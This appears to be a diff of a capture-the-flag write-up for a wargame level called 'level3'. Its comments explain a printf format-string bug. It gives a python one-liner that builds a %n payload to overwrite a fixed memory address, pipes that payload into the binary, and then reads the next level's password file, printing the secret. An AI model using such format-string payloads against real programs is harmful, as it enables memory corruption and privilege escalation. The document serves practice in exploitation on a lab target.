@@ -1,1 +1,11 @@
-python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/b
+# We notify that inside the binary, the input from user is directly printed to terminal via "printf" without formatter and then an arbitrary memory address is compare
+to branch on critical section
+# We craft our exploit with the formatter "%n" who let "printf" function write the number of characters until it.
+# At the time of call to "printf", the beginning of user input will be on the fourth argument on the stack so we use "$" formatter to let the "%n" access it
+# Then we settle the size of our payload to the value of the arbitrary memory address.
+
+python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/payload_level3
+cat /tmp/payload_level3 - | ./level3 
+
+$ cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
